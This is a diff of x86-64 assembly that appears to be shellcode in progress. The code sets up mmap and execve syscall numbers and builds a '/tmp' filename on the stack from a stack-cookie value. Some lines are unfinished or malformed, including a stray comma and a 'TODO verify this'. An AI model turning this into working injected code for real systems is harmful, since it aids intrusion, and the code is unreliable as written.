@@ -8,12 +8,8 @@
 BITS 64 
 	global main
 	
-	%define __NR_open   BYTE 0x2
-	%define __NR_write  BYTE 0x1
-	%define __NR_mmap   BYTE 0x9
-	%define __NR_execve BYTE 0x59
-	%define filename   fs:0x28 ; 64 bit
-	; %define stackcookie [gs:0x14] ; 32 bit
+	%include "../include/syscalls64.s"
+
 	%define openflags 0x42 ; O_CREAT|O_RDWR
 	%define size 0xffff
 
@@ -43,8 +39,8 @@ main:
 	mov sil, 0x1
 	shl rsi, 22		; rsi = 4M
 
-	mv dl, 0x3		; rdx = 0x3
-	mv cl, 0x2		; rdl = 0x2
+	mov dl, 0x3		; rdx = 0x3
+	mov cl, 0x2		; rdl = 0x2
 
 	mov al, __NR_mmap
 	syscall 		; call mmap
@@ -59,7 +55,7 @@ main:
 	mov rdi, rax
 	mov rdx, rax
 	push rax,
-	push dword stackcookie
+	push qword stackcookie  ; TODO verify this
 	push 0x706d742f		; stack = /tmp/filename\0
 	mov rdi, rsp		; rdi = stack
 	mov rsi, rax	
